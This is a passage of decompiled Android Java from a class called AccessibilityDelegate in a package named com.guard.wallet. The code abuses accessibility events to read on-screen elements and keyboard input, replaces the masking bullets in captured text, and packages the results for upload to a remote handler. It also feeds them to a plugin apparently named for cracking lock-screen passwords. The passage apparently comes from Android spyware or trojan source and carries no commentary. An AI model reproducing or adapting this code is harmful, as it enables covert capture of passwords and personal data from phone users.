                        var15 = var14.getNode();
                     } catch (Exception var5) {
                        var10000 = var5;
                        boolean var22 = false;
                        break;
                     }

                     if (var15 != null) {
                        return var14;
                     }
                  }
               }
            }
         }

         Exception var12 = var10000;
         a1.q.s("AccessibilityDelegate", var12);
      }

      return null;
   }

   public final void j(String var1) {
      try {
         String var2 = com.guard.wallet.utils.h.l("helpSubscribeId");
         if (!a1.q.B(var2) && Objects.equals(var2, var1)) {
            if (com.guard.wallet.helper.r.k()) {
               com.guard.wallet.helper.r.g(true);
            }

            if (com.guard.wallet.helper.o.i() || com.guard.wallet.helper.o.h()) {
               com.guard.wallet.helper.o.f(null, true);
            }

            ReqListenHelper var4 = new ReqListenHelper(var1, 4);
            var4.setDelegateId(this.c);
            com.guard.wallet.http.l.h(var4);
            com.guard.wallet.utils.h.w("helpSubscribeId");
            Log.d("AccessibilityDelegate", "已经发送 完成辅助监听");
         }
      } catch (Exception var3) {
         a1.q.s("AccessibilityDelegate", var3);
      }
   }

   public final UiObject k() {
      return (UiObject)this.h.get();
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final LinkedHashSet l() {
      ConcurrentLinkedQueue var2 = this.d;

      Exception var10000;
      label46: {
         LinkedHashSet var1;
         Iterator var3;
         try {
            if (var2.isEmpty()) {
               return null;
            }

            var1 = new LinkedHashSet();
            var3 = var2.iterator();
         } catch (Exception var6) {
            var10000 = var6;
            boolean var10001 = false;
            break label46;
         }

         while (true) {
            try {
               if (!var3.hasNext()) {
                  return var1;
               }

               var8 = (ListenWindow)var3.next();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var9 = false;
               break;
            }

            if (var8 != null) {
               try {
                  if (var8.getEventTypes() != null && !var8.getEventTypes().isEmpty()) {
                     var1.addAll(var8.getEventTypes());
                  }
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var10 = false;
                  break;
               }
            }
         }
      }

      Exception var7 = var10000;
      a1.q.s("AccessibilityDelegate:getEventTypes", var7);
      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final UiObject m(int var1, String var2) {
      int var3 = var1;
      if (var1 < 0) {
         var3 = 0;
      }

      UiObject var4 = null;
      Object var6 = null;
      UiObject var5 = var4;

      Exception var10000;
      label79: {
         label80: {
            try {
               if (!a1.q.B(var2)) {
                  break label80;
               }
            } catch (Exception var14) {
               var10000 = var14;
               boolean var10001 = false;
               break label79;
            }

            var5 = var4;

            try {
               return (UiObject)this.h.get();
            } catch (Exception var13) {
               var10000 = var13;
               boolean var18 = false;
               break label79;
            }
         }

         var5 = var4;

         Object var7;
         try {
            var7 = this.m.get(var2);
         } catch (Exception var12) {
            var10000 = var12;
            boolean var19 = false;
            break label79;
         }

         UiObject var15 = (UiObject)var6;
         var5 = var4;

         label81: {
            try {
               if (!(var7 instanceof UiObjectCollection)) {
                  break label81;
               }
            } catch (Exception var11) {
               var10000 = var11;
               boolean var20 = false;
               break label79;
            }

            var5 = var4;

            try {
               var15 = ((UiObjectCollection)var7).get(var3);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var21 = false;
               break label79;
            }
         }

         var5 = var15;
         var4 = var15;

         try {
            if (!(var7 instanceof UiObject)) {
               return var4;
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var22 = false;
            break label79;
         }

         if (var3 != 0) {
            return var15;
         }

         var5 = var15;

         try {
            var4 = (UiObject)var7;
            return var4;
         } catch (Exception var8) {
            var10000 = var8;
            boolean var23 = false;
         }
      }

      Exception var16 = var10000;
      a1.q.s("AccessibilityDelegate", var16);
      return var5;
   }

   public final UiObject n(CombineFilter var1) {
      String var2 = var1.getResUnique();
      return this.m(var1.getTarget(), var2);
   }

   public final boolean o() {
      AtomicInteger var2 = this.g;
      boolean var1;
      if (var2.get() >= 0 && var2.get() <= 10) {
         var1 = true;
      } else {
         var1 = false;
      }

      return var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean p(ListenWindow var1, UiObject var2) {
      Exception var10000;
      label71: {
         List var5;
         try {
            var5 = var1.getMatchs();
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label71;
         }

         AtomicReference var4;
         var4 = this.h;
         label63:
         if (var5 != null) {
            try {
               if (var1.getMatchs().isEmpty()) {
                  break label63;
               }

               var14 = var1.getMatchs().iterator();
            } catch (Exception var10) {
               var10000 = var10;
               boolean var16 = false;
               break label71;
            }

            try {
               while (var14.hasNext()) {
                  CombineFilter var6 = (CombineFilter)var14.next();
                  if (!this.t(var6, var2) && !this.t(var6, (UiObject)var4.get())) {
                     return false;
                  }
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var17 = false;
               break label71;
            }
         }

         try {
            if (var1.getDismiss() == null || var1.getDismiss().isEmpty()) {
               return true;
            }

            var15 = var1.getDismiss().iterator();
         } catch (Exception var8) {
            var10000 = var8;
            boolean var18 = false;
            break label71;
         }

         while (true) {
            boolean var3;
            try {
               if (!var15.hasNext()) {
                  return true;
               }

               CombineFilter var13 = (CombineFilter)var15.next();
               if (this.t(var13, var2)) {
                  return false;
               }

               var3 = this.t(var13, (UiObject)var4.get());
            } catch (Exception var7) {
               var10000 = var7;
               boolean var19 = false;
               break;
            }

            if (var3) {
               return false;
            }
         }
      }

      Exception var12 = var10000;
      a1.q.s("matchListenWindow 2:", var12);
      return true;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean q(List var1) {
      if (var1 != null) {
         Exception var10000;
         label115: {
            boolean var4;
            try {
               var4 = var1.isEmpty();
            } catch (Exception var15) {
               var10000 = var15;
               boolean var10001 = false;
               break label115;
            }

            if (var4) {
               return false;
            }

            AtomicReference var5 = this.h;

            try {
               if (var5.get() != null) {
                  ((UiObject)var5.get()).refresh();
               }
            } catch (Exception var14) {
               var10000 = var14;
               boolean var21 = false;
               break label115;
            }

            try {
               var16 = var1.iterator();
            } catch (Exception var13) {
               var10000 = var13;
               boolean var22 = false;
               break label115;
            }

            label101:
            while (true) {
               boolean var3;
               label99: {
                  label116: {
                     boolean var2;
                     ListenWindow var6;
                     label97: {
                        label96: {
                           label95: {
                              Iterator var20;
                              try {
                                 if (!var16.hasNext()) {
                                    return false;
                                 }

                                 var6 = (ListenWindow)var16.next();
                                 ListenWindow var7 = new ListenWindow((String)this.j.get(), (String)this.k.get());
                                 if (!var6.equals(var7)) {
                                    break label116;
                                 }

                                 if (var6.getMatchs() == null || var6.getMatchs().isEmpty()) {
                                    break label95;
                                 }

                                 var20 = var6.getMatchs().iterator();
                              } catch (Exception var12) {
                                 var10000 = var12;
                                 boolean var23 = false;
                                 break;
                              }

                              try {
                                 while (var20.hasNext()) {
                                    if (!this.t((CombineFilter)var20.next(), (UiObject)var5.get())) {
                                       break label96;
                                    }
                                 }
                              } catch (Exception var11) {
                                 var10000 = var11;
                                 boolean var24 = false;
                                 break;
                              }
                           }

                           var2 = true;
                           break label97;
                        }

                        var2 = false;
                     }

                     var3 = var2;

                     try {
                        if (var6.getDismiss() == null) {
                           break label99;
                        }
                     } catch (Exception var10) {
                        var10000 = var10;
                        boolean var25 = false;
                        break;
                     }

                     var3 = var2;

                     try {
                        if (var6.getDismiss().isEmpty()) {
                           break label99;
                        }

                        var19 = var6.getDismiss().iterator();
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var26 = false;
                        break;
                     }

                     do {
                        var3 = var2;

                        try {
                           if (!var19.hasNext()) {
                              break label99;
                           }

                           var4 = this.t((CombineFilter)var19.next(), (UiObject)var5.get());
                        } catch (Exception var8) {
                           var10000 = var8;
                           boolean var27 = false;
                           break label101;
                        }
                     } while (!var4);
                  }

                  var3 = false;
               }

               if (var3) {
                  return true;
               }
            }
         }

         Exception var17 = var10000;
         a1.q.s("matchListenWindow 1:", var17);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final ArrayList r(EventSubscribe var1, UiObject var2) {
      ArrayList var3 = new ArrayList();

      Exception var10000;
      label91: {
         try {
            if (var1.getSelector() == null) {
               return var3;
            }
         } catch (Exception var12) {
            var10000 = var12;
            boolean var10001 = false;
            break label91;
         }

         if (var2 != null) {
            try {
               var15 = s(var1, var2);
            } catch (Exception var11) {
               var10000 = var11;
               boolean var17 = false;
               break label91;
            }

            if (var15 != null) {
               try {
                  if (!var15.isEmpty()) {
                     var3.addAll(var15);
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var18 = false;
                  break label91;
               }
            }
         }

         AtomicReference var16 = this.h;

         label92: {
            try {
               if (var16.get() == null) {
                  return var3;
               }

               if (!var3.isEmpty() || !Objects.equals(var1.getSourceRule(), 0) && !Objects.equals(var1.getSourceRule(), 1)) {
                  break label92;
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var19 = false;
               break label91;
            }

            LinkedList var4;
            try {
               var4 = s(var1, (UiObject)var16.get());
            } catch (Exception var8) {
               var10000 = var8;
               boolean var20 = false;
               break label91;
            }

            if (var4 != null) {
               try {
                  if (!var4.isEmpty()) {
                     var3.addAll(var4);
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var21 = false;
                  break label91;
               }
            }
         }

         try {
            if (!Objects.equals(var1.getSourceRule(), 2)) {
               return var3;
            }

            var13 = s(var1, (UiObject)var16.get());
         } catch (Exception var6) {
            var10000 = var6;
            boolean var22 = false;
            break label91;
         }

         if (var13 == null) {
            return var3;
         }

         try {
            if (!var13.isEmpty()) {
               var3.addAll(var13);
            }

            return var3;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var23 = false;
         }
      }

      Exception var14 = var10000;
      a1.q.s("AccessibilityDelegate", var14);
      return var3;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean t(CombineFilter var1, UiObject var2) {
      if (var2 != null && var1 != null) {
         Exception var10000;
         label54: {
            k.a var4;
            try {
               var4 = var1.toGlobalSelector((String)this.l.get());
            } catch (Exception var7) {
               var10000 = var7;
               boolean var10001 = false;
               break label54;
            }

            int var3 = 0;

            while (true) {
               if (var4 == null) {
                  return false;
               }

               try {
                  if (var3 > var1.getRepeatCount()) {
                     return false;
                  }

                  if (var4.t(var2) != null) {
                     return true;
                  }
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var9 = false;
                  break;
               }

               try {
                  if (var3 >= var1.getRepeatCount()) {
                     return false;
                  }

                  com.guard.wallet.utils.g.T0(2);
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var10 = false;
                  break;
               }

               var3++;
            }
         }

         Exception var8 = var10000;
         a1.q.s("AccessibilityDelegate:matchWindowFromParent", var8);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public void u(AccessibilityEvent var1, String var2, String var3) {
      if (var1 != null) {
         Exception var10000;
         label54: {
            UiObject var6;
            try {
               if (!this.o()) {
                  return;
               }

               var6 = UiObject.createRoot(var1.getSource(), true);
            } catch (Exception var11) {
               var10000 = var11;
               boolean var10001 = false;
               break label54;
            }

            String var5 = this.c;
            if (var6 != null) {
               try {
                  var6.setUniqueId(var5);
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var14 = false;
                  break label54;
               }
            }

            String var4;
            label40: {
               try {
                  if (var1.getEventType() == 16 && var1.getBeforeText() != null) {
                     var4 = var1.getBeforeText().toString();
                     break label40;
                  }
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var15 = false;
                  break label54;
               }

               var4 = null;
            }

            try {
               j0 var7 = new j0(var6, var1.getEventType(), var2, var3, var4);
               d var13 = new d(this, var7, 0);
               com.guard.wallet.thread.l.c(var13, var5);
               return;
            } catch (Exception var8) {
               var10000 = var8;
               boolean var16 = false;
            }
         }

         Exception var12 = var10000;
         a1.q.s("AccessibilityDelegate:onAccessibilityEvent", var12);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void v(UiObject var1, boolean var2, String var3, String var4, String var5) {
      AtomicReference var7 = this.h;

      Exception var10000;
      label56: {
         label50: {
            try {
               if (Objects.equals(var1, var7.get())) {
                  break label50;
               }

               if (var7.get() != null) {
                  Log.d("AccessibilityDelegate", "delegate activeRoot recycle");
                  ((UiObject)var7.get()).recycle();
               }
            } catch (Exception var12) {
               var10000 = var12;
               boolean var10001 = false;
               break label56;
            }

            try {
               this.m.clear();
               Log.d("AccessibilityDelegate", "delegate activeRoot 已更改");
            } catch (Exception var11) {
               var10000 = var11;
               boolean var16 = false;
               break label56;
            }
         }

         String var6 = this.c;
         if (var1 != null) {
            try {
               var1.setUniqueId(var6);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var17 = false;
               break label56;
            }
         }

         try {
            var7.set(var1);
         } catch (Exception var9) {
            var10000 = var9;
            boolean var18 = false;
            break label56;
         }

         AtomicBoolean var13 = this.i;

         try {
            var13.set(var2);
            this.j.set(var3);
            this.k.set(var4);
            this.l.set(var5);
            if (!var13.get()) {
               e.a var15 = new e.a(this, 1);
               com.guard.wallet.thread.l.c(var15, var6);
            }

            return;
         } catch (Exception var8) {
            var10000 = var8;
            boolean var19 = false;
         }
      }

      Exception var14 = var10000;
      a1.q.s("AccessibilityDelegate", var14);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void w(boolean var1) {
      AtomicInteger var2 = this.g;
      Exception var10000;
      if (var1) {
         try {
            var2.set(0);
            return;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var10001 = false;
         }
      } else {
         try {
            this.h.get();
            var2.set(var2.get() + 1);
            return;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var6 = false;
         }
      }

      Exception var5 = var10000;
      a1.q.s("AccessibilityDelegate", var5);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void x(EventSubscribe var1, ArrayList var2, String var3, String var4, Long var5) {
      ConcurrentHashMap var14 = this.f;
      if (var1.getListenProps() != null && !var1.getListenProps().isEmpty()) {
         LinkedList var13 = new LinkedList();
         String var11 = "GESTURE_POINTS";
         String var10 = var11;
         String var9 = var11;

         label356: {
            label355: {
               label354: {
                  Exception var10000;
                  label363: {
                     try {
                        if (var2.isEmpty()) {
                           break label355;
                        }
                     } catch (Exception var54) {
                        var10000 = var54;
                        boolean var10001 = false;
                        break label363;
                     }

                     var9 = var11;

                     Iterator var12;
                     try {
                        var12 = var2.iterator();
                     } catch (Exception var53) {
                        var10000 = var53;
                        boolean var80 = false;
                        break label363;
                     }

                     int var6 = 0;
                     var56 = var11;

                     label345:
                     while (true) {
                        var10 = var56;
                        var9 = var56;

                        try {
                           if (!var12.hasNext()) {
                              break label355;
                           }
                        } catch (Exception var44) {
                           var10000 = var44;
                           boolean var81 = false;
                           break;
                        }

                        var9 = var56;

                        UiObject var15;
                        try {
                           var15 = (UiObject)var12.next();
                        } catch (Exception var43) {
                           var10000 = var43;
                           boolean var82 = false;
                           break;
                        }

                        var9 = var56;

                        try {
                           var71 = var1.getListenProps().iterator();
                        } catch (Exception var42) {
                           var10000 = var42;
                           boolean var83 = false;
                           break;
                        }

                        while (true) {
                           var9 = var56;

                           label366: {
                              try {
                                 if (!var71.hasNext()) {
                                    break label366;
                                 }
                              } catch (Exception var52) {
                                 var10000 = var52;
                                 boolean var84 = false;
                                 break label345;
                              }

                              var9 = var56;

                              try {
                                 var73 = (String)var71.next();
                              } catch (Exception var41) {
                                 var10000 = var41;
                                 boolean var85 = false;
                                 break label345;
                              }

                              var9 = var56;

                              try {
                                 if (a1.q.B(var73)) {
                                    continue;
                                 }
                              } catch (Exception var47) {
                                 var10000 = var47;
                                 boolean var86 = false;
                                 break label345;
                              }

                              var9 = var56;

                              try {
                                 if (Objects.equals(var73, var56)) {
                                    continue;
                                 }
                              } catch (Exception var46) {
                                 var10000 = var46;
                                 boolean var87 = false;
                                 break label345;
                              }

                              var9 = var56;

                              try {
                                 if (Objects.equals(var73, "TOUCH_POINT")) {
                                    continue;
                                 }
                              } catch (Exception var45) {
                                 var10000 = var45;
                                 boolean var88 = false;
                                 break label345;
                              }

                              var9 = var56;

                              boolean var7;
                              try {
                                 var7 = Objects.equals(var73, "text");
                              } catch (Exception var40) {
                                 var10000 = var40;
                                 boolean var89 = false;
                                 break label345;
                              }

                              label376: {
                                 label331:
                                 if (var7) {
                                    var9 = var56;

                                    try {
                                       if (a1.q.B(var3)) {
                                          break label331;
                                       }
                                    } catch (Exception var51) {
                                       var10000 = var51;
                                       boolean var90 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    StringBuilder var16;
                                    try {
                                       var16 = new StringBuilder();
                                    } catch (Exception var39) {
                                       var10000 = var39;
                                       boolean var91 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    try {
                                       // [VF-FIX] var16 = new StringBuilder();
                                    } catch (Exception var38) {
                                       var10000 = var38;
                                       boolean var92 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    try {
                                       var16.append("监听到前置属性:");
                                    } catch (Exception var37) {
                                       var10000 = var37;
                                       boolean var93 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    try {
                                       var16.append(var73);
                                    } catch (Exception var36) {
                                       var10000 = var36;
                                       boolean var94 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    try {
                                       var16.append(":");
                                    } catch (Exception var35) {
                                       var10000 = var35;
                                       boolean var95 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    try {
                                       var16.append(var3);
                                    } catch (Exception var34) {
                                       var10000 = var34;
                                       boolean var96 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    try {
                                       Log.d("AccessibilityDelegate", var16.toString());
                                    } catch (Exception var33) {
                                       var10000 = var33;
                                       boolean var97 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    String var17;
                                    try {
                                       var17 = var3.replaceAll("•", "*");
                                    } catch (Exception var32) {
                                       var10000 = var32;
                                       boolean var98 = false;
                                       break label345;
                                    }

                                    var9 = var56;

                                    try {
                                       // [VF-FIX] new moved to init line
                                    } catch (Exception var31) {
                                       var10000 = var31;
                                       boolean var99 = false;
                                       break label345;
                                    }

                                    try {
                                       var74 = new ListenPropResponse(var6, var73, var17, var1.getEventTimestamp());
                                       var13.add(var74);
                                    } catch (Exception var50) {
                                       var10000 = var50;
                                       boolean var100 = false;
                                       break label376;
                                    }
                                 }

                                 try {
                                    if (Objects.equals(var73, "text") && !a1.q.B(var4)) {
                                       StringBuilder var67 = new StringBuilder();
                                       var67.append("监听到键盘属性:");
                                       var67.append(var73);
                                       var67.append(":");
                                       var67.append(var4);
                                       Log.d("AccessibilityDelegate", var67.toString());
                                       var9 = var4.replaceAll("•", "*");
                                       ListenPropResponse var75 = new ListenPropResponse(var6, var73, var9, var1.getEventTimestamp());
                                       var13.add(var75);
                                    }
                                 } catch (Exception var49) {
                                    var10000 = var49;
                                    boolean var101 = false;
                                    break label376;
                                 }

                                 try {
                                    var9 = var15.getProperty(var73);
                                    if (!a1.q.B(var9)) {
                                       StringBuilder var76 = new StringBuilder();
                                       var76.append("监听到属性:");
                                       var76.append(var73);
                                       var76.append(":");
                                       var76.append(var9);
                                       Log.d("AccessibilityDelegate", var76.toString());
                                       String var77 = var9.replaceAll("•", "*");
                                       ListenPropResponse var70 = new ListenPropResponse(var6, var73, var77, var1.getEventTimestamp());
                                       var13.add(var70);
                                    }
                                    continue;
                                 } catch (Exception var48) {
                                    var10000 = var48;
                                    boolean var102 = false;
                                 }
                              }

                              var57 = var10000;
                              break label354;
                           }

                           var6++;
                           var12 = var12;
                           break;
                        }
                     }
                  }

                  var57 = var10000;
                  var56 = var9;
               }

               a1.q.s("AccessibilityDelegate:postListenProps", var57);
               break label356;
            }

            var56 = var10;
         }

         Exception var79;
         label369: {
            label370: {
               try {
                  if (var13.isEmpty()) {
                     return;
                  }

                  if (Objects.equals(var1.getListenType(), 0)
                     || Objects.equals(var1.getListenType(), 1)
                     || Objects.equals(var1.getListenType(), 8)
                     || Objects.equals(var1.getListenType(), 9)) {
                     break label370;
                  }

                  var3 = var1.getId();
               } catch (Exception var29) {
                  var79 = var29;
                  boolean var103 = false;
                  break label369;
               }

               boolean var65;
               label249: {
                  try {
                     if (!a1.q.B(var3)) {
                        var65 = var14.containsKey(var3);
                        break label249;
                     }
                  } catch (Exception var30) {
                     Exception var59 = var30;

                     try {
                        a1.q.s("AccessibilityDelegate", var59);
                     } catch (Exception var28) {
                        var79 = var28;
                        boolean var104 = false;
                        break label369;
                     }
                  }

                  var65 = false;
               }

               if (!var65) {
                  try {
                     var3 = var1.getId();
                  } catch (Exception var27) {
                     var79 = var27;
                     boolean var105 = false;
                     break label369;
                  }

                  try {
                     if (!a1.q.B(var3) && !var14.containsKey(var3)) {
                        var14.put(var3, System.currentTimeMillis());
                     }
                  } catch (Exception var26) {
                     Exception var61 = var26;

                     try {
                        a1.q.s("AccessibilityDelegate", var61);
                     } catch (Exception var25) {
                        var79 = var25;
                        boolean var106 = false;
                        break label369;
                     }
                  }
               }
            }

            boolean var66;
            label223: {
               label374: {
                  try {
                     if (!Objects.equals(var1.getListenType(), 8) && !Objects.equals(var1.getListenType(), 9)) {
                        break label374;
                     }
                  } catch (Exception var24) {
                     var79 = var24;
                     boolean var107 = false;
                     break label369;
                  }

                  boolean var8;
                  try {
                     var8 = var1.isNeedReply();
                  } catch (Exception var23) {
                     var79 = var23;
                     boolean var108 = false;
                     break label369;
                  }

                  var66 = var8;
                  if (var8) {
                     try {
                        StringBuilder var62 = new StringBuilder();
                        var62.append("postListenProps 有需要响应的前置订阅,需要上传监听结果");
                        var62.append(var1.getListenProps().toString());
                        Log.d("AccessibilityDelegate", var62.toString());
                        this.z(var1);
                     } catch (Exception var22) {
                        var79 = var22;
                        boolean var109 = false;
                        break label369;
                     }

                     var66 = var8;
                  }
                  break label223;
               }

               var66 = true;
            }

            label206: {
               try {
                  var63 = new ListenResponseVO();
                  var63.setBatchId(String.valueOf(var5));
                  var63.setSubscribeId(var1.getId());
                  var63.setListenId(var1.getListenId());
                  var63.setDelegateId(this.c);
                  var63.setResponses(var13);
                  var64 = new MessageRecordVO();
                  var64.setExtraBody(var63);
                  var64.setIntentCode("android.accessibility.delegate.LISTEN_WINDOW_EVENT");
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                     break label206;
                  }
               } catch (Exception var21) {
                  var79 = var21;
                  boolean var110 = false;
                  break label369;
               }

               if (var66) {
                  try {
                     MainApplication.getInstance().getHandlerMsgAndTimer().a(var64);
                  } catch (Exception var20) {
                     var79 = var20;
                     boolean var111 = false;
                     break label369;
                  }
               }
            }

            try {
               if (!Objects.equals(var1.getListenType(), 1) || !a1.q.B(var1.getHelperProp()) && !Objects.equals(var1.getHelperProp(), var56)) {
                  return;
               }
            } catch (Exception var19) {
               var79 = var19;
               boolean var112 = false;
               break label369;
            }

            try {
               if (MainApplication.getInstance() != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                  MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                  com.guard.wallet.plug.c.j(var63);
               }

               return;
            } catch (Exception var18) {
               var79 = var18;
               boolean var113 = false;
            }
         }

         Exception var55 = var79;
         a1.q.s("AccessibilityDelegate", var55);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final SearchNodeResultVO y(int var1, String var2) {
      int var3 = var1;
      if (var1 < 0) {
         var3 = 0;
      }

      Object var5 = null;

      Exception var10000;
      label70: {
         UiObject var6;
         try {
            var6 = this.m(var3, var2);
         } catch (Exception var12) {
            var10000 = var12;
            boolean var10001 = false;
            break label70;
         }

         if (var6 == null) {
            return null;
         }

         try {
            var6.refresh();
         } catch (Exception var11) {
            var10000 = var11;
            boolean var17 = false;
            break label70;
         }

         String var4 = var2;

         label45: {
            try {
               if (a1.q.B(var2)) {
                  var4 = String.valueOf(this.b.a());
               }
            } catch (Exception var10) {
               var10000 = var10;
               boolean var18 = false;
               break label45;
            }

            try {
               this.m.put(var4, var6);
               UiObjectVO var7 = new UiObjectVO(var6);
               return new SearchNodeResultVO(var4, var7);
            } catch (Exception var9) {
               var10000 = var9;
               boolean var19 = false;
            }
         }

         Exception var13 = var10000;

         try {
            a1.q.s("AccessibilityDelegate", var13);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var20 = false;
            break label70;
         }

         return (SearchNodeResultVO)var5;
      }

      Exception var14 = var10000;
      a1.q.s("AccessibilityDelegate", var14);
      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void z(EventSubscribe var1) {
      Exception var10000;
      label43: {
         try {
            if (var1.getReplySubscribes() == null || var1.getReplySubscribes().isEmpty()) {
               return;
            }

            var7 = var1.getReplySubscribes().iterator();
         } catch (Exception var6) {
            var10000 = var6;
            boolean var10001 = false;
            break label43;
         }

         while (true) {
            String var2;
            try {
               if (!var7.hasNext()) {
                  return;
               }

               var2 = (String)var7.next();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10 = false;
               break;
            }

            try {
               if (!a1.q.B(var2)) {
                  this.f.remove(var2);
               }
            } catch (Exception var4) {
               Exception var9 = var4;

               try {
                  a1.q.s("AccessibilityDelegate", var9);
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var11 = false;
                  break;
               }
            }
         }
      }

      Exception var8 = var10000;
      a1.q.s("AccessibilityDelegate", var8);
   }
}
